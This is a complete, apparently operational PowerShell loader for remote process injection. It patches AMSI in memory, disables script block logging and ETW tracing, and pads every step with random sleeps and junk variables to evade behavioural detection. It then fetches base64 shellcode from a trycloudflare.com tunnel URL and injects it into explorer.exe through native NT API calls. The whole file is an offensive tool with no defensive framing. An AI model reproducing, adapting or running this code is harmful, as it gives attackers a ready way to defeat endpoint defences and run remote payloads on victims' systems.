# Obfuscated Remote Process Injection - PS5 x64
# Random delays and junk code to evade behavioral detection

$x1=[Math]::PI;$x2=[Math]::E;$rnd=New-Object Random
$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
[Net.ServicePointManager]::SecurityProtocol='Tls12'

# AMSI bypass with junk
$x3=[type]"System.Int32";Start-Sleep -Milliseconds ($rnd.Next(50,200))
$W=@"
using System;using System.Runtime.InteropServices;
public class W{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}
"@
Add-Type $W;$x4=[type]"System.String"
$L=[W]::LoadLibrary("am"+"si.dll");Start-Sleep -Milliseconds ($rnd.Next(30,100))
$A=[W]::GetProcAddress($L,"Amsi"+"Scan"+"Buffer")
$p=0;$x5=[DateTime]::Now
[W]::VirtualProtect($A,[UIntPtr]::new(0x20),0x40,[ref]$p)|Out-Null
$B=[Byte[]](0x41,0x5F,0x41,0x5E,0x5F,0xB8,0x57,0x00,0x07,0x80,0xC3)
$A=[Int64]$A+0x14;Start-Sleep -Milliseconds ($rnd.Next(40,120))
[Runtime.InteropServices.Marshal]::Copy($B,0,[IntPtr]$A,$B.Length)
[W]::VirtualProtect([IntPtr]$A,[UIntPtr]::new(0x20),$p,[ref]$p)|Out-Null

# Logging bypass with delays
try{$s=[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null);Start-Sleep -Milliseconds ($rnd.Next(30,90));if($s['ScriptBlockLogging']){$s['ScriptBlockLogging']['EnableScriptBlockLogging']=0}}catch{}
try{[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');Start-Sleep -Milliseconds ($rnd.Next(40,100));$b=$a.GetField('etwProvider','NonPublic,Static');$b.SetValue($null,0)}catch{}

# Syscalls with obfuscation
$x6=[guid]::NewGuid().ToString()
$code = @'
using System;
using System.Runtime.InteropServices;

public class Syscall {
    [DllImport("ntdll.dll")]
    public static extern uint NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr BytesBuffer);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
'@
$x7=[Environment]::MachineName;Start-Sleep -Milliseconds ($rnd.Next(50,150))
Add-Type $code

# Download with delay
$x8=[Environment]::UserName;Start-Sleep -Milliseconds ($rnd.Next(60,180))
try {
    $sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))
} catch {
    return
}

# Target process
$x9=[Environment]::OSVersion;Start-Sleep -Milliseconds ($rnd.Next(40,130))
try {
    $targetPid = (Get-Process explorer -ErrorAction Stop)[0].Id
} catch {
    return
}

# Open process with delay
$x10=[DateTime]::UtcNow;Start-Sleep -Milliseconds ($rnd.Next(50,140))
$hProcess = [IntPtr]::Zero
$oa = New-Object Syscall+OBJECT_ATTRIBUTES
$oa.Length = [Runtime.InteropServices.Marshal]::SizeOf([Type][Syscall+OBJECT_ATTRIBUTES])
$cid = New-Object Syscall+CLIENT_ID
$cid.UniqueProcess = [IntPtr]::new($targetPid)
$status = [Syscall]::NtOpenProcess([ref]$hProcess, 0x1FFFFF, [ref]$oa, [ref]$cid)
if ($status -ne 0) { return }

# Allocate with delay
$x11=[Environment]::ProcessorCount;Start-Sleep -Milliseconds ($rnd.Next(60,170))
$baseAddr = [IntPtr]::Zero
$regionSize = [IntPtr]::new($sc.Length + 4096)
$status = [Syscall]::NtAllocateVirtualMemory($hProcess, [ref]$baseAddr, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x04)
if ($status -ne 0) { return }

# Write with delay
$x12=[System.Diagnostics.Process]::GetCurrentProcess().Id;Start-Sleep -Milliseconds ($rnd.Next(50,160))
$written = [uint32]0
$status = [Syscall]::NtWriteVirtualMemory($hProcess, $baseAddr, $sc, [uint32]$sc.Length, [ref]$written)
if ($status -ne 0) { return }

# Protect with delay
$x13=[Environment]::CurrentDirectory;Start-Sleep -Milliseconds ($rnd.Next(40,120))
$protectAddr = $baseAddr
$protectSize = [IntPtr]::new($sc.Length)
$oldProtect = [uint32]0
$status = [Syscall]::NtProtectVirtualMemory($hProcess, [ref]$protectAddr, [ref]$protectSize, 0x20, [ref]$oldProtect)
if ($status -ne 0) { return }

# Execute with final delay
$x14=[guid]::NewGuid();Start-Sleep -Milliseconds ($rnd.Next(70,200))
$hThread = [IntPtr]::Zero
$status = [Syscall]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $baseAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
